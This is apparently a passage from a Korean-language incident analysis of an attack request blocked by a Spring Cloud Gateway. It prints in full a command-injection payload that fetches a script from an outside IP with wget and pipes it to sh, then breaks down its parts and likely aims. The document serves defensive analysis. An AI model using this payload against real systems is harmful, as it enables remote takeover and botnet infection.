### 2.3 공격 페이로드 분석

#### 공격 페이로드 구조
```
GET /cgi-bin/;wget${IFS}-qO-${IFS}http://74.194.191.52/rondo.sbx.sh|sh&echo${IFS} HTTP/1.0
```

#### 페이로드 구성 요소 분석

1. **타겟 경로**: `/cgi-bin/`
   - CGI 스크립트 실행 경로를 노리는 것으로 보임
   - Spring Cloud Gateway에는 CGI 스크립트가 없음

2. **명령 구분자**: `;`
   - 명령 체이닝을 위한 구분자
   - 여러 명령을 연속 실행 시도

3. **다운로드 명령**: `wget${IFS}-qO-${IFS}http://74.194.191.52/rondo.sbx.sh`
   - `${IFS}`: Internal Field Separator (공백 문자 대체)
   - `wget -qO-`: 조용히 다운로드하여 stdout으로 출력
   - **악성 스크립트 URL**: `http://74.194.191.52/rondo.sbx.sh`
   - **의심스러운 도메인**: `74.194.191.52` (악성 스크립트 호스팅 서버로 추정)

4. **파이프 및 실행**: `|sh`
   - 다운로드한 스크립트를 즉시 실행 시도
   - `sh` 셸로 스크립트 실행

5. **에코 명령**: `&echo${IFS}`
   - 백그라운드 실행 후 에코 명령
   - 공격 시도 은폐 시도

### 2.4 공격 목적 추정

이 공격은 다음과 같은 목적을 가진 것으로 추정됩니다:

1. **원격 코드 실행 (RCE)**
   - 악성 스크립트(`rondo.sbx.sh`)를 다운로드하여 실행
   - 서버 제어권 획득 시도

2. **봇넷 가입**
   - `rondo.sbx.sh`는 봇넷에 가입시키는 스크립트일 가능성
   - DDoS 공격, 암호화폐 채굴 등에 활용될 수 있음

3. **데이터 탈취**
   - 서버에 접근하여 데이터베이스 정보, API 키 등 탈취 시도

4. **백도어 설치**
   - 지속적인 접근을 위한 백도어 설치 시도

### 2.5 방어 메커니즘 분석

#### 차단 단계: HTTP 파싱 레벨 (Netty)

```
공격 요청
  ↓
Netty HTTP 파서
  ↓
URISyntaxException 발생
  ↓
"Decoding failed" 오류
  ↓
요청 차단 (HTTP 파싱 단계에서 실패)
```

**차단 이유**:
- URI에 포함된 특수 문자(`;`, `|`, `&`, `${IFS}`)가 유효하지 않은 URI 형식
- Java의 `URISyntaxException`이 발생하여 요청 파싱 실패
- 실제 애플리케이션 로직에 도달하기 전에 차단됨

**차단 효과**:
- ✅ 공격 페이로드가 애플리케이션에 전달되지 않음
- ✅ 명령 실행 시도 없음
- ✅ 악성 스크립트 다운로드 없음
- ✅ 서버 보안 유지

1. 모든 공격 시도가 HTTP 파싱 단계에서 차단됨
2. 실제 애플리케이션 로직에 도달하지 못함
3. 명령 실행 시도 없음
4. 악성 스크립트 다운로드 없음

### 8.2 방어 효과

**결론**: ✅ **완벽한 방어**

**주요 방어 메커니즘**:
1. **Netty HTTP 파서**: 비정상적인 HTTP 요청을 파싱 단계에서 차단
2. **IP 블랙리스트 필터**: 공격 IP 차단 (향후 효과)
3. **JWT 인증**: 인증되지 않은 요청 차단
